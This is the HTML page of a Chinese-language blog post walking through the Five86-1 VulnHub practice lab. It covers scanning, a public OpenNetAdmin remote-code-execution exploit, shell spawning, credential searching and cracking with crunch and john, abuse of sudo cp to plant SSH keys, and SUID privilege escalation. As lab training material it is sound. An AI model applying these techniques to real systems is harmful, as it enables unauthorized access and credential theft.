@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="rLK4SDXJnpVzDEdijSouVN_Y8JP7FmWeyChotNzHzkw">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/dropbox-32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/dropbox-16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/mm?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="vulnhub,OSCP,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="荼雨's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Five86-1">
+<meta name="keywords" content="vulnhub,OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Five86-1">
+<meta property="og:url" content="https://evilh2o2.github.io/2020/03/10/Five86-1/index.html">
+<meta property="og:site_name" content="荼雨&#39;s Blog">
+<meta property="og:description" content="Five86-1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:updated_time" content="2020-03-10T11:42:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Five86-1">
+<meta name="twitter:description" content="Five86-1">
+<meta name="twitter:image" content="https://evilh2o2.github.io/2020/03/10/Five86-1/2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://evilh2o2.github.io/2020/03/10/Five86-1/">
+
+
+
+
+
+  <title>Five86-1 | 荼雨's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">荼雨's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Web安全 | 安全狗 | 攻</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evilh2o2.github.io/2020/03/10/Five86-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="荼雨">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/log-img2.svg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="荼雨's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Five86-1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T10:53:46+08:00">
+                2020-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnhub/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnhub</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,157 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6 分钟
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  Five86-1
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
+</blockquote>
+<br>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>扫服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<hr>
+<br>
+
+<p>访问 80 端口，无有价值信息</p>
+<p>例行扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>经访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>搜索相关漏洞，得到远程命令执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
+
+<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
+<br>
+
+<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+<p>使用 MSF：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
+<br>
+
+<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
+
+<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
+<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
+<br>
+
+<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>涉及知识的盲区了，特地去查询记录了一下</p>
+<br>
+
+<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<br>
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+
+<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
+<br>
+<br>
+
+<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
+<br>
+
+<p>不过，也是学到技能了</p>
+<br>
+
+<p>也可以使用如下方式：</p>
+<ul>
+<li>创建一个权限 <code>777</code> 的文件</li>
+<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
+<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
+<li><code>cat</code> 查看</li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/vulnhub/" rel="tag"><i class="fa fa-tag"></i> vulnhub</a>
+          
+            <a href="/tags/OSCP/" rel="tag"><i class="fa fa-tag"></i> OSCP</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/09/hackNos-2/" rel="next" title="hackNos-2">
+                <i class="fa fa-chevron-left"></i> hackNos-2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/19/Five86-2/" rel="prev" title="Five86-2">
+                Five86-2 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/log-img2.svg" alt="荼雨">
+            
+              <p class="site-author-name" itemprop="name">荼雨</p>
+              <p class="site-description motion-element" itemprop="description">Welcome 荼雨's Blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
